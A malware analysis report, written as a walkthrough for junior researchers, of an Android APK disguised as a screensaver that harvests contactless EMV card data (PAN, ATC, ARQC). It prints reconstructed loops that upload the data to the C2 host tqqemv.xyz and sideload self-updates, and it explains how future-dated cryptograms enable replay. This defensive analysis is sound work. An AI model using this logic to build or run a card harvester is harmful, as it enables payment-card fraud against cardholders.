# CKEMV-Harvester APK — Class-by-Class & Function-by-Function Project Report

**Audience:** A junior researcher who has read a little Android internals and a little EMV theory, but has never opened this APK before.
**Sample:** `samples/ckemv/sample.apk` (6.76 MB), package `xyz.happify.ckemv`, label *"Geometry Saver"*.
**Source tree:** `samples/ckemv/apk_analysis/sources/sources/`. The Java code splits into two packages:

- `xyz.happify.ckemv/` — 10 named Java files (the "public" surface: data models, JNI bridges, the Activity, the WorkManager job).
- `B2/` — ~23 obfuscated single-letter Kotlin classes (the actual "plumbing": DB helper, coroutines for NFC, upload, config-fetch, UI animation, FileProvider sideload). `jadx` couldn't recover the original Kotlin names, so we read the classes by their *behavior*.
- A few support packages (`com.journeyapps.barcodescanner` for ZXing, `okhttp3`, `androidx.*`, `kotlin.*`) come from third-party libraries and are not authored by the operator. We skip those — the analysis below covers only the code the operator wrote.

This report walks the code as if you were doing a code review with a colleague over your shoulder. Each class gets a purpose sentence, then a function-by-function description.

---

## 0. The 30-second mental model

Hold this picture in your head before you read any code:

```
                                       ┌─────────────────────────────────────────┐
                                       │              tqqemv.xyz (C2)            │
                                       │  /me  /harvest  /report  (/update_apk)  │
                                       └──────▲──────────┬──────────────▲────────┘
                                              │          │              │
   (1) tap card on phone        (3) post 10s  │          │ (4) every 60s│ (5) sideload
                                              │          │   pull cves  │   self-update
                                              │          ▼              │   APK
   ┌────────────┐    ┌──────────────────────┐ │   ┌──────────────┐  ┌───┴──────────┐
   │  EMV card  │───>│  MainActivity (NFC)  │─┴──>│  SQLite cache │  │ FileProvider │
   └────────────┘    │       + B2/q.java    │     │ CkemvHarvest  │  │  ACTION_VIEW │
                     └─────────┬────────────┘     │      .db      │  └──────────────┘
                               │ (2) drive APDUs  └──────────────┘
                               ▼
                     ┌──────────────────────┐
                     │ EmvKernel  (JNI)     │
                     │ libckemv_android.so  │
                     └──────────────────────┘
```

Java's job is glue. The "smart" parts (EMV state machine, TLS) live in two stripped Rust `.so` files; Java just calls them.

---

## 1. Package `xyz.happify.ckemv` — the named classes

### 1.1 `AppVersion.java` — operator-side version descriptor

**Purpose.** Tells the app what version the C2 *thinks* should be running. Used to gate the self-updater.

This is a Kotlin `data class` projected into Java; it has the usual hand-written boilerplate that decompilers always emit (`copy()`, `componentN()`, `equals`, `hashCode`, `toString`). When you see those, ignore them — they are mechanical and not interesting for behavior.

**Fields**

| Field | Type | Meaning |
| --- | --- | --- |
| `major` | `int` | Major version returned from `/me`. |
| `minor` | `int` | Minor version returned from `/me`. |
| `hash` | `String` | Build commit hash (informational; not used by the updater logic). |

**Functions**

- `AppVersion(int major, int minor, String hash)` — three-arg constructor. The `g.e(str, "hash")` line is Kotlin's null-check intrinsic (`Intrinsics.checkParameterIsNotNull`) — it throws `NullPointerException` at the boundary if a non-null contract is violated.
- `getMajor() / getMinor() / getHash()` — plain getters.
- `copy(int, int, String) / copy$default(...)` — Kotlin's data-class deep-copy. Not invoked anywhere in this codebase; ignore.
- `component1/2/3()` — destructuring accessors. Not called.
- `equals / hashCode / toString` — standard data-class behavior.

**How it's used.** Only in `B2/t.java` (the config loop), where the code compares `latest_version.major > 1 || (major == 1 && minor > 7)` against the hard-coded internal version **1.7**. If the C2 advertises 1.8+, the self-updater fires.

---

### 1.2 `CveConfig.java` — a single "scenario" played against a tapped card

**Purpose.** The unit of attacker playbook. The C2 sends down a list of these in `/me`'s response; the app caches them in the SQLite `cves` table and replays them against every tapped card.

Note: "CVE" here is the operator's jargon, *not* a real CVE-numbered vulnerability. Think "configurable EMV transaction".

**Fields**

| Field | Type | Meaning |
| --- | --- | --- |
| `id` | `int` | Stable scenario ID. Echoed back in every harvested transaction so the C2 can correlate which scenario produced which ARQC. |
| `name` | `String` | Human label (operator-side). |
| `amount` | `int` | Starting transaction amount in minor units (e.g. cents). The runtime decrements this per inner iteration — see `B2/q.java`. |
| `mastercard_tags` | `Map<String,String>` | TLV overlay applied when the tapped card is a Mastercard scheme. Keys are EMV tag hex (e.g. `9F02`, `9F1A`), values are TLV value hex. |
| `visa_tags` | `Map<String,String>` | Same idea, for Visa. |

The "tag" maps are the heart of the attack: they let the operator pre-program the terminal-side data that the EMV kernel will inject into CDOL1/CDOL2 when asking the card to generate an ARQC. Per-scenario, this is how the operator changes *amount*, *currency*, *country*, *terminal capabilities*, etc.

**Functions.** Constructor + getters + the usual data-class boilerplate. Nothing functional beyond that.

---

### 1.3 `CardRecord.java` — a single tapped-card capture, before upload

**Purpose.** In-memory record produced by `B2/q.java` (the NFC handler) and persisted into the SQLite `cards`+`transactions` tables by `B2/a.java::o`. Also rebuilt from those tables before upload in `B2/s.java`.

**Fields**

| Field | Type | Meaning |
| --- | --- | --- |
| `pan` | `String` | Card primary account number, decoded by the Rust kernel from EMV tag `5A` (or `57` track-2 if `5A` absent). |
| `aid` | `String` | Application Identifier picked by the kernel after PPSE selection. |
| `network` | `String` | `"Visa"`, `"Mastercard"`, or `"Unknown"` — inferred from the AID prefix. |
| `rawData` | `String` | JSON-encoded TLV bag returned by `EmvKernel.getRawData()` — everything the kernel saw on the wire. |
| `txs` | `List<HarvestedTx>` | All ARQC/ATC pairs harvested in this single tap session. Up to 20 per matching `CveConfig`. |

**Functions.** Constructor, getters, boilerplate. No real logic.

---

### 1.4 `HarvestedTx.java` — one ARQC capture inside a `CardRecord`

**Purpose.** Represents *one* successful execution of *one* scenario against the card. Each card-tap produces N `HarvestedTx` instances (one per inner-loop iteration of `B2/q.java`).

**Fields**

| Field | Type | Meaning |
| --- | --- | --- |
| `atc` | `String` | Application Transaction Counter — EMV tag `9F36`. Two-byte counter the chip increments per transaction; defenders use it to spot replays. |
| `arqc` | `String` | Authorization Request Cryptogram — EMV tag `9F26`. 8-byte MAC produced by the card over a CDOL1-derived buffer using a session key derived from the issuer master key. **This is the prize the harvester is after.** |
| `timeMs` | `double` | Wall-clock duration of the kernel session in milliseconds (operator telemetry / detection-of-stalls). |
| `params` | `String` | JSON of the terminal-side input parameters the kernel actually used (so the C2 can replay or audit). |
| `cve_id` | `int` | Foreign-key style pointer back to the `CveConfig.id` that produced this tx. |

**Functions.** Constructor + getters + boilerplate. No logic.

> **Junior researcher note.** Why capture both ATC and ARQC? Because an issuer-side validator typically needs the (ATC, ARQC, terminal-side CDOL data) tuple to recompute and compare. The harvester collects all of it.

---

### 1.5 `MeResponse.java` — wire shape of `GET /me`

**Purpose.** Top-level JSON the C2 returns to the device when it polls for fresh scenarios.

**Fields**

| Field | Type | Meaning |
| --- | --- | --- |
| `name` | `String` | Operator/collector display name (never shown in the UI; useful telemetry only). |
| `cves` | `List<CveConfig>` | Fresh scenario list. Replaces the local `cves` table wholesale. |
| `latest_version` | `AppVersion` (nullable) | If set and newer than `1.7`, triggers self-update. |

**Functions.** Data-class boilerplate. The interesting thing is consumption, in `B2/t.java::k` and `SyncWorker.f`.

---

### 1.6 `EmvKernel.java` — JNI bridge into `libckemv_android.so`

**Purpose.** The thinnest possible Java shim over the Rust EMV state machine. **All ten methods are `native`**; the Java side never implements behavior. The class is a Kotlin `object` (singleton), exposed as `EmvKernel.INSTANCE`.

```java
public final class EmvKernel {
    public static final EmvKernel INSTANCE = new EmvKernel();
    static { System.loadLibrary("ckemv_android"); }
    private EmvKernel() {}
    ...native methods...
}
```

**Functions** (all `native`)

| Method | What the kernel does when you call it |
| --- | --- |
| `initialize(boolean isContactless, String paramsJson)` | Spin up a fresh state machine. `isContactless` is hard-wired to `true` in `B2/q.java`. The JSON is the **flattened scenario** — `mastercard_tags`/`visa_tags` plus runtime overrides (`9A` date, `9F02` amount). The kernel parses this into per-stage TLV overlays (`fci`, `gpo`, `sfi`, `cdol1`, `cdol2`, `ppse`). |
| `String getStatus()` | Returns `"InProgress"` while the kernel still wants APDUs, `"Done"`/`"Error"` otherwise. Driver loop in `B2/q.java` polls this. |
| `String getNextCommand()` | Returns the next APDU as hex (e.g. `00A40400…`). Empty string means "I have nothing for you yet". |
| `String processResponse(String responseHex)` | Feed back the card's reply. Internally advances the state machine. |
| `String getPan()` | EMV tag `5A` (or PAN extracted from `57` Track-2 Equivalent Data). |
| `String getAid()` | Selected Application Identifier. |
| `String getAtc()` | Application Transaction Counter (`9F36`). |
| `String getArqc()` | The cryptogram itself (`9F26`). Empty if the card refused / went AAC. |
| `String getTxParameters()` | JSON of the terminal-side input data actually used in this transaction. |
| `String getRawData()` | JSON TLV bag with everything observed. |

The driver loop is dirt simple — see `B2/q.java`. The Java side knows nothing about EMV; it is just an APDU pump.

> **Pitfall to flag.** `processResponse` returns `String` but its return value is *never read* by the Java caller. The actual state mutation happens inside the Rust object that backs `INSTANCE`. Don't be misled into thinking the return value is a status — it isn't used.

---

### 1.7 `Reporter.java` — JNI bridge into `libckemv_reporter.so`

**Purpose.** Three-call HTTPS client implemented in Rust (`ureq + rustls + ring`). Class is a Kotlin singleton (`Reporter.INSTANCE`).

```java
public final class Reporter {
    public static final Reporter INSTANCE = new Reporter();
    static { System.loadLibrary("ckemv_reporter"); }
    ...
}
```

**Functions**

| Method | Behind the scenes |
| --- | --- |
| `String fetchCves(String apiKey, String baseUrl)` | `GET {baseUrl}/me` with `Authorization: Bearer {apiKey}`. Returns the raw response body, or `"Error: …"` on failure (string-prefix protocol — Java callers grep for the literal `"Error"`). |
| `String fetchReport(String apiKey, String baseUrl)` | `GET {baseUrl}/report`. **Has no Java caller** in this build — leftover from a panel-side feature or a future operator dashboard endpoint. |
| `String uploadHarvestData(String json, String apiKey, String baseUrl)` | `POST {baseUrl}/harvest` with JSON body. Java callers check the response for the substring `"Success"` to decide whether to delete the local rows. |

The native side embeds Mozilla's CA bundle (~140 anchors) and does *no* certificate pinning, so an enterprise MITM CA installed via Android Enterprise is trusted. That's the defender's win.

> **Junior researcher note.** The `apiKey` arg order is different between `fetchCves` and `uploadHarvestData` — `(apiKey, url)` vs `(json, apiKey, url)`. Pay attention; it's easy to swap accidentally.

---

### 1.8 `SyncWorker.java` — WorkManager redundancy for the config loop

**Purpose.** Belt-and-suspenders job. If the foreground activity dies, `WorkManager` still pulls fresh scenarios from `/me` every 15 minutes. Scheduled in `MainActivity.onCreate` as a `PeriodicWorkRequest` keyed by name `"CkemvSyncWork"`.

It is a `CoroutineWorker` — Android's coroutine-aware `Worker` subclass — which means `f()` here is what jadx decompiled `doWork()` to.

**Functions**

- `SyncWorker(Context, WorkerParameters)` — bog-standard constructor; saves the context for use in `f()`.
- `f()` (= `doWork()`) — the actual job:
  1. Build a `B2.a` DB helper.
  2. Read the API key from `stats.api_key`. If absent, skip this run.
  3. Call `Reporter.INSTANCE.fetchCves(apiKey, "https://tqqemv.xyz")`.
  4. If the response doesn't start with `"Error"`, parse it with Gson into a `MeResponse`.
  5. If parsing succeeded and `cves != null`, replace the local `cves` table via `a.A(cves)` and return `Result.Success` (`new o(m0.g.f3972b)`).
  6. Otherwise return `Result.Failure` (`new Object()` resolved to `m0.m` by the compiler).

Note that this worker does **not** check for app updates — only the active-activity loop in `B2/t.java` does. If the operator releases a new APK while the harvester is backgrounded, the device picks it up the next time the user opens the app.

---

### 1.9 `MainActivity.java` — the only Activity

**Purpose.** Hosts the UI decoy, wires NFC foreground dispatch, launches the three background coroutines, and contains the OkHttp-based self-update downloader.

The file is large (~660 lines) and full of jadx-induced control-flow noise. We'll walk the *meaningful* members.

**Fields**

| Field | Purpose |
| --- | --- |
| `NfcAdapter f5251x` | The system NFC adapter handle. |
| `PendingIntent f5252y` | Self-targeting intent the system fires when a tag is discovered (foreground dispatch). |
| `boolean f5253z` | Re-entrancy guard for the self-update download (`w()` won't run twice in parallel). |
| `B2.a f5247A` | The SQLite helper. Created in `onCreate`. |
| `LinearLayout f5248B` | The "right-side action area" — a hidden long-press hot zone that launches the QR scanner. |
| `ProgressBar f5249C` | The 8-px-tall green progress bar shown during NFC reads. |
| `h2.o D` | A coroutine `MutableStateFlow<Integer>` carrying the progress %. Updated by `B2/q.java`, consumed by `B2/l.java → B2/k.java`. |
| `c f5250E` | The `ActivityResultLauncher` for ZXing's `CaptureActivity`. The callback lives in `B2/b.java`. |

**Static helpers**

- `static String v(MainActivity, byte[])` — bytes → uppercase hex (`%02X`). Used to encode APDU responses for `EmvKernel.processResponse`.
- `static byte[] x(MainActivity, String)` — hex → bytes. Inverse of `v()`. Used to encode APDU commands before `IsoDep.transceive`.
- `static Object w(MainActivity, String apiKey, String version, d continuation)` — the self-update downloader. Despite jadx's mangled output, the recoverable behavior is:
  1. Mark `f5253z = true` so we don't recurse.
  2. Build a JSON body `{"api_key":"<apiKey>"}` and POST it via OkHttp (`okhttp3.OkHttpClient` is bundled in the APK at `m2.o`). The URL is built from a constant — the request goes to the same `tqqemv.xyz` host as the rest.
  3. If `200 ≤ status < 300`, stream the response body into `{externalFilesDir(DOWNLOADS)}/update_v{version}.apk` using Okio (`z2.o`).
  4. Hop to the main thread (`Dispatchers.Main` = `j2.o.f3534a`) and run `B2.h` (see §2.6) to launch the install intent.
  5. On non-2xx, hop to main thread and run `B2.p` (hide progress bar).
  6. Finally clear `f5253z`.

**Lifecycle callbacks**

- `onCreate(Bundle)` — does seven things in order. Worth reading slowly:
  1. `getWindow().addFlags(128)` — `FLAG_KEEP_SCREEN_ON`. Keeps the activity from dimming, otherwise tap-to-NFC sessions would die.
  2. Hide the action bar (`l.M(false)`).
  3. Build the SQLite helper (`this.f5247A = new a(this)`).
  4. **Whitelist itself from battery optimization.** If the OS reports we're not on the whitelist, immediately fire the `ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` settings intent to ask the user. Hostile UX, but classic.
  5. Build the UI tree programmatically:
     - Root `LinearLayout` with `#121212` background ("vault dark").
     - Top row: a `TextView` (empty text, the long-press target for **paste-an-API-key** dialog) + the hidden right-side action area (long-press target for **scan-QR-API-key**).
     - 8-px green `ProgressBar` (`#00E676`) below the row, initially `INVISIBLE`.
     - A `B2.w` view (the animated dots-and-lines decoy) takes the rest of the screen with `layout_weight=1`.
  6. **Schedule the WorkManager periodic job** (`SyncWorker`, 15 minutes, name `CkemvSyncWork`) — see §1.8.
  7. **Launch the three coroutines** (see §2 for the bodies):
     - `B2.l` on `Dispatchers.Main` — pumps the progress-bar `StateFlow`.
     - `B2.s` on `Dispatchers.IO` — the 10-second upload loop.
     - `B2.t` on `Dispatchers.IO` — the 60-second config / self-update loop.
  8. Configure `NfcAdapter.getDefaultAdapter(this)` and a `PendingIntent` that targets itself (`Intent.FLAG_ACTIVITY_SINGLE_TOP` = `0x20000000`, plus `PendingIntent.FLAG_IMMUTABLE` = `0x4000_0000`/`0x0800_0000` depending on SDK).
- `onResume()` — call `NfcAdapter.enableForegroundDispatch(this, pendingIntent, filters, techList)`. The tech list is `IsoDep`; the filters are `TAG_DISCOVERED`, `TECH_DISCOVERED`, and `NDEF_DISCOVERED` with mime type `*/*`. This is what guarantees the OS dispatches NFC events to *this* activity instead of routing them to whatever default handler the user might have.
- `onPause()` — symmetric `disableForegroundDispatch(this)`.
- `onNewIntent(Intent)` — entry point for an NFC discovery while the activity is foregrounded:
  1. Bail unless the action is one of the three NFC actions.
  2. Pull the `Tag` parcelable. If missing, fire an empty UI runnable and return.
  3. `IsoDep.get(tag)` — gives an `IsoDep` channel if the card is ISO/IEC 14443-4-compliant (every contactless EMV card is).
  4. If `IsoDep` is non-null, launch `B2.q` on `Dispatchers.IO` to drive the kernel against the card.

**Inner long-press listeners.** jadx flattened them into a single anonymous class with a `switch (i4)`/`switch (i3)`; conceptually there are two:

- *Case 0* (the empty top-row text view): `AlertDialog` with a paste field titled **"Manual Key Update"**. On `UPDATE`, trims the input and writes it via `UPDATE stats SET api_key=? WHERE id=1`.
- *Case 1* (the right-side action area): launches ZXing `CaptureActivity` configured for `QR_CODE` only, prompt `"Scan Collector API Key"`, beep on, camera 0, no orientation lock, no barcode image. The result is delivered through `f5250E.Q(xVar)` and consumed by `B2/b.java::a(Object)`.

---

### 1.10 `R.java` — generated resource table

390 KB of auto-generated `public static final int` constants for resources, drawables, themes, etc. **Not interesting** to read. Skip unless you need to map a specific `0x7f…` ID to a name.

---

## 2. Package `B2/` — the actual operator code

These classes are decompiled Kotlin with the original names stripped to single letters. We document them by behavior.

### 2.1 `B2/a.java` — `DatabaseHelper` (extends `SQLiteOpenHelper`)

**Purpose.** Wraps the on-device cache `CkemvHarvest.db` (version 8). Four tables:

```sql
cards         (id PK, pan, aid, network, raw_data, timestamp)
transactions  (id PK, card_id FK, atc, arqc, time_ms, params, cve_id)
stats         (id PK, total_scans, api_key)   -- exactly one row, id=1
cves          (id PK, name, amount, mc_tags, visa_tags)  -- scenario cache
```

**Functions**

- `a(Context)` — calls `super(context, "CkemvHarvest.db", null, 8)`. Version 8 matters: `onUpgrade` from anything < 8 wipes every table (including a *vestigial* `terminals` table from earlier builds — telling us this family has shipped before).
- `onCreate(SQLiteDatabase)` — runs the four `CREATE TABLE` statements above and seeds `stats` with `(0, NULL)`.
- `onUpgrade(SQLiteDatabase, int oldVer, int newVer)` — if `oldVer < 8`, `DROP TABLE` everything (including `terminals`) and call `onCreate`. No data migration — operators don't care about retention.
- `i()` — reads `stats.api_key`. Returns `null` if not set yet.
- `o(CardRecord)` — atomic-ish insert: writes one `cards` row, then iterates `cardRecord.getTxs()` writing one `transactions` row each. Returns the new `cards.id` (or `-1` on failure). **No `BEGIN`/`COMMIT` wrapping here** — relies on SQLite's autocommit mode, which means a crash mid-loop can leave a card row with a partial tx list. Not a defect for the harvester's purpose; just an observation.
- `a(long id)` — deletes the `transactions` rows for `card_id = id` first, then the `cards` row. Called after a successful upload.
- `A(List<CveConfig>)` — **wholesale-replace** the `cves` table inside `beginTransaction()` … `endTransaction()`. The contents are reserialized to JSON with Gson (`b1.l`) for the two `*_tags` map columns. This is how the operator rotates playbooks: just push a fresh `cves[]` from `/me`.
- `b()` — **`getAllCves()`**, reconstructed from the decompiled fragments. Reads every row of `cves`, JSON-decodes `mc_tags`/`visa_tags` into `Map<String,String>` (or `emptyMap` if null/missing), and returns `ArrayList<CveConfig>`. *(jadx couldn't reassemble the body cleanly — it inlined the comment "DatabaseHelper$getAllCves$type$1" which is the recovered original class name. Treat this as the obvious read counterpart to `A`.)*

---

### 2.2 `B2/b.java` — multi-purpose anonymous-class shim

This single class is reused by jadx as three interfaces glued together. Two implementations matter:

- `a(Object obj)` — `ActivityResultCallback<ScanIntentResult>` for ZXing. When the QR scanner returns, `wVar.f380a` is the decoded string. If non-null, write it directly to `stats.api_key`. This is the *non-paste* path for getting an API key onto the device.
- `c(C0117a)` — `SupportSQLiteOpenHelper.Factory` for Room/WorkManager. Not the operator's code path; Android internals.

---

### 2.3 `B2/q.java` — **the NFC tap handler.** This is the heart of the harvester.

**Purpose.** Run as a coroutine on `Dispatchers.IO` whenever `MainActivity.onNewIntent` discovers an `IsoDep` tag. Drives every cached `CveConfig` through the kernel.

This is a `suspend` lambda; jadx renders it as a class extending `Q1.g` with state in `f93f`/`g`. The continuation machine is mostly noise. Below is the recovered behavior:

1. **`mainActivity.D.c(0)`** — set progress = 0 on the StateFlow.
2. Hop to `Dispatchers.Main` to run `B2.m` (sets `ProgressBar` visible).
3. **`isoDep.connect(); isoDep.setTimeout(10_000)`** — open the channel with a 10-second per-transceive timeout.
4. **Load scenarios** — `cves = dbHelper.b()`. If empty, close ISO-Dep, hop to main to hide the progress bar (`B2.p`), return.
5. **SELECT PPSE** — transceive `00 A4 04 00 0E "2PAY.SYS.DDF01"` (hex `00A404000E325041592E5359532E444446303100`). PPSE = Proximity Payment System Environment, the contactless directory.
6. **Scheme inference** — search the PPSE response hex for `A000000003` → `"Visa"`, `A000000004` → `"Mastercard"`, else `"Unknown"`.
7. **Filter scenarios** — keep only those that have a non-empty tag map for the detected scheme. If none, hop to main, hide progress bar, return.
8. **For each surviving scenario**, run a **3-level nested loop**:
   - Outer index `i9 ∈ {0, 1, 2}` — day offset. `Calendar.getInstance().add(DAY_OF_YEAR, i9)`, formatted `"yyMMdd"` in `Locale.CHINA`. (The CN locale doesn't affect the digits but does pin number formatting; it's a cultural marker, not functionally important.)
   - Inner count `i4` — 8 for `i9 ∈ {0,1}`, 4 for `i9 == 2`, so **8+8+4 = 20 transactions per scenario per scheme per tap**.
   - Per inner iteration:
     - `amount = (amount * 95) / 100 - rand(0..100)` — randomized 5%-or-so taper. If `amount < 100`, break.
     - Build `linkedHashMap = copy of scenario tags`, then **overlay** `9A = yyMMdd` and `9F02 = "%012d"` of the amount.
     - `EmvKernel.initialize(true, JSONObject(linkedHashMap).toString())`.
     - Tight loop while `getStatus() == "InProgress"`: `nextCommand = getNextCommand()`; if non-empty, `isoDep.transceive(hex→bytes)` and feed the bytes (as hex) back into `processResponse`.
     - When done: read `atc`, `arqc`, `pan`, `aid`, `rawData`, `txParameters`. If `arqc.length() != 0`, append `HarvestedTx(atc or "N/A", arqc, elapsedMs, params, cveConfig.id)` to the running list.
     - `mainActivity.D.c((i7 * 100) / totalCount)` — update progress %.
9. **Close ISO-Dep.** Wrap accumulated `txs` in a `CardRecord(pan, aid, network, rawData, txs)` and `dbHelper.o(cardRecord)` to persist.
10. **Build the upload JSON inline** (same shape used by the upload loop in §2.4) and launch `B2.o` on `Dispatchers.IO` to push it immediately. This is a *best-effort* fast path; the canonical upload still happens via the 10-second loop in `B2.s` reading from the DB.
11. Hop to main, hide progress bar.

**Errors.** Catches everything. On any exception, just closes ISO-Dep and bails. No retries, no telemetry — the operator only sees the missed tap as a missing row at the C2.

**Why the day-offset trick?** Today, today+1, today+2. The transaction date `9A` is the chip's only freshness signal that the terminal supplies. Generating three days lets the operator pick a future-dated cryptogram suitable for replay/relay over up to a 2-day window without re-tapping.

---

### 2.4 `B2/s.java` — the 10-second upload loop

**Purpose.** Background coroutine launched once from `onCreate` on `Dispatchers.IO`. Sweeps every `cards` row + its `transactions`, uploads each, deletes on `"Success"`.

Decompiled control flow is messy; recovered behavior:

```
loop forever {
  apiKey = dbHelper.i() ?: "no-key"
  for each row of (SELECT * FROM cards ORDER BY id ASC) {
      hydrate CardRecord by fetching its tx rows
      jsonBody = canonical upload JSON  (see §2.6 below)
      response = Reporter.uploadHarvestData(jsonBody, apiKey, "https://tqqemv.xyz")
      if ("Success" in response) {
          dbHelper.a(card.id)           // delete card + its txs
          execSQL("UPDATE stats SET total_scans = total_scans + 1 WHERE id = 1")
          hop to main to run B2.r       // small UI ack — see §2.10
      }
  }
  delay(10_000)
}
```

There is **no jitter, no exponential backoff, no retry counter, no offline queue depth limit**. On a flaky network the device pounds the C2 every 10 seconds with the same payload until it sticks.

---

### 2.5 `B2/t.java` — the 60-second config / self-update loop

**Purpose.** Background coroutine launched from `onCreate` on `Dispatchers.IO`. Pulls fresh `/me`, replaces local `cves`, and triggers self-update when the C2 advertises a newer version.

```
loop forever {
  apiKey = dbHelper.i()
  if (apiKey != null) {
      d2.d.m0(apiKey, 8)               // truncate to 8 chars for some discarded purpose (logging?)
      raw = Reporter.fetchCves(apiKey, "https://tqqemv.xyz")
      if (!"Error" in raw) {
          me = Gson.fromJson<MeResponse>(raw)
          cves = me?.cves
          lv = me?.latest_version
          if (lv != null && (lv.major > 1 || (lv.major == 1 && lv.minor > 7))) {
              version = "${lv.major}.${lv.minor}"
              MainActivity.w(activity, apiKey, version, continuation)   // download + sideload
          }
          if (cves != null) dbHelper.A(cves)
      }
  }
  delay(60_000)
}
```

Note the literal `1.7` in the version comparator — that is the build's internal version threshold. If you ever see *another* sample in this family with a different constant here, you've spotted a build rev.

---

### 2.6 `B2/h.java` — the FileProvider sideload kicker

**Purpose.** Run on `Dispatchers.Main` (because we need to call `startActivity`). Takes the downloaded `update_v{x}.apk` `File` and fires an `ACTION_VIEW` intent at it via the app's own FileProvider authority — that's how an app on Android 7+ asks the system to launch the **standard "Install unknown apps?" prompt** for an APK in its own private storage.

`k(obj)` (= `invoke`) does:

```java
Uri uri = FileProvider.c(activity, pkg + ".fileprovider", file);
Intent i = new Intent(Intent.ACTION_VIEW);
i.setDataAndType(uri, "application/vnd.android.package-archive");
i.setFlags(FLAG_ACTIVITY_NEW_TASK | FLAG_GRANT_READ_URI_PERMISSION);  // 268435457 = 0x10000001
activity.startActivity(i);
```

Combined with the `REQUEST_INSTALL_PACKAGES` permission declared in the manifest, this is a *one-tap* path for the user to accept replacement of the running app.

---

### 2.7 `B2/o.java` — the immediate-after-tap uploader

**Purpose.** "Try to upload this card right now". Spawned at the end of `B2.q`'s tap handler. Same body as one iteration of `B2.s`, minus the loop:

```java
suspend fun k(...) {
    val resp = Reporter.uploadHarvestData(json.toString(), apiKey, "https://tqqemv.xyz")
    if ("Success" in resp) {
        dbHelper.a(cardRowId)
        dbHelper.writableDatabase.execSQL("UPDATE stats SET total_scans = total_scans + 1 WHERE id = 1")
        withContext(Dispatchers.Main) { B2.n(activity).invoke() }   // brief progress flash
    }
}
```

If this succeeds, the slow loop in `B2.s` finds nothing to upload on its next tick. If this fails (no network at the moment of the tap), `B2.s` will retry every 10s.

---

### 2.8 `B2/w.java` — the **UI decoy** (a custom `View`)

**Purpose.** The entire visible app. There is no real UI; this view exists to make "Geometry Saver" plausible as a screensaver/visualizer.

**Fields**

- `Paint f106b` — stroked, 3 px wide, antialiased.
- `ArrayList<v> c` — 16 dot objects (see `B2.v` below).
- `boolean f107d` — animation kill switch (set `false` in `onDetachedFromWindow`).

**Functions**

- `w(Context)` — constructor. Generates 16 `v` instances with random position (100..500), radius (20..80), velocity (-10..10), and bright RGB color (50..255 per channel). Spawns the animation thread `new Thread(new u(0, this)).start()`.
- `onDraw(Canvas)` —
  - Fills `#121212` background.
  - Draws each dot as a filled circle in its own color.
  - For every unordered pair of dots within Euclidean distance < 200 px, draws a 1-px translucent white line between them (the "constellation" effect).
- `onDetachedFromWindow()` — sets `f107d = false` to kill the animation thread.

---

### 2.9 `B2/u.java` — multi-purpose `Runnable` adapter

jadx fused many lambdas into this one class with a `switch (this.f100b)`. The relevant case is **0**, which is the `w` view's animation thread:

```java
while (wView.f107d) {
    for (each dot v) {
        v.x += v.vx;  v.y += v.vy;
        if (x±r out of view bounds) vx *= -1;
        if (y±r out of view bounds) vy *= -1;
    }
    wView.postInvalidate();
    Thread.sleep(16);   // ~60 FPS
}
```

The other cases (1–16) all belong to Android internals (WorkManager, sidesheet, AppCompat). They are not the operator's code; ignore.

---

### 2.10 `B2/m.java` / `B2/p.java` / `B2/n.java` / `B2/r.java` — main-thread UI hops

Each is a one-shot `suspend` lambda that touches the UI:

- `B2.m` — show the green progress bar (`setVisibility(VISIBLE)`).
- `B2.p` — hide the green progress bar (`setVisibility(INVISIBLE)`).
- `B2.n` / `B2.r` — recoverable as the "upload acknowledged" UI flashes (briefly pulse the progress bar, then hide it). They are functionally interchangeable; the operator only needs the visual cue.

If you've ever wondered why a thread-marshalling primitive needs its own class file in decompiled Kotlin: each `withContext(Dispatchers.Main) { … }` block becomes one anonymous `SuspendLambda` subclass. Welcome to Kotlin coroutines as seen by jadx.

---

### 2.11 `B2/l.java` — main-thread progress-bar pump

**Purpose.** Runs on `Dispatchers.Main`. Collects from `mainActivity.D` (the progress `StateFlow<Integer>`) and feeds each value into `B2.k`, which calls `progressBar.setProgress(value)`. Decoupling like this is so the NFC handler (on IO) can post progress updates from a non-UI thread without thread-policy violations.

**Function**

- `k(obj)` — `mainActivity.D.collect(B2.k(mainActivity))`. The compiler scaffolding (`h2.b`, `h2.k`, `O1.j.f782b`) is just `Flow.collect` machinery; don't be distracted.

---

### 2.12 `B2/v.java` — the dot struct

Pure data record used by `B2.w`:

```java
class v {
    float x, y, r, vx, vy;
    int   color;
}
```

No methods of interest.

---

### 2.13 Other `B2/*.java` files — short notes

| File | Role (one line) |
| --- | --- |
| `c.java`, `f.java`, `g.java`, `i.java`, `j.java`, `k.java` | Coroutine continuation classes generated by the Kotlin compiler. `f.java` in particular is the continuation state machine for `MainActivity.w` (the self-updater) — that's why it has fields `f80e`/`f81f`/`g`/`h`/`f83j` holding "this, apiKey, version, resumed object, label index". |
| `InterfaceC0106a.java`, `InterfaceC0107b.java` | Empty marker interfaces generated by the compiler. Not operator-authored. |
| `d.java` (long-press lambda inside MainActivity) | The `View.OnLongClickListener` adapter for the two long-press handlers (paste-key + scan-QR). |

You don't need to read these to understand behavior; they exist because Kotlin coroutines + lambdas are compiled into per-call-site classes.

---

## 3. Cross-cutting behavior tables

### 3.1 Which Java class owns which lifecycle responsibility

| Concern | Owner |
| --- | --- |
| App entry, NFC dispatch, UI layout, coroutine launch | `xyz.happify.ckemv.MainActivity` |
| Background scenario refresh (15-min, dies-with-process-safe) | `xyz.happify.ckemv.SyncWorker` |
| Tap-time card harvesting | `B2.q` (driven by `MainActivity.onNewIntent`) |
| Persistence (cards, txs, cves, stats) | `B2.a` (extends `SQLiteOpenHelper`) |
| Periodic upload (10 s) | `B2.s` |
| Periodic config / version poll (60 s) | `B2.t` |
| Self-update download | `MainActivity.w` (static, uses bundled OkHttp) |
| Self-update install kick-off | `B2.h` (FileProvider + `ACTION_VIEW`) |
| Decoy UI | `B2.w` + `B2.v` + `B2.u (case 0)` |
| API-key intake (paste / QR) | `MainActivity` long-press listeners + `B2.b` (QR callback) |
| Native EMV state machine | `EmvKernel` → `libckemv_android.so` |
| Native HTTPS + C2 transport | `Reporter` → `libckemv_reporter.so` |

### 3.2 Data lifecycle of one captured card

```
NFC intent ──▶ MainActivity.onNewIntent
              │
              └─launch(IO) B2.q
                  ├─ EmvKernel: drive 20×N APDU sessions per scenario
                  ├─ accumulate HarvestedTx list
                  ├─ B2.a.o(CardRecord)   ── INSERT into cards+transactions
                  └─launch(IO) B2.o
                        └─ Reporter.uploadHarvestData
                              ├─ on "Success": B2.a.a(id)  -> rows deleted
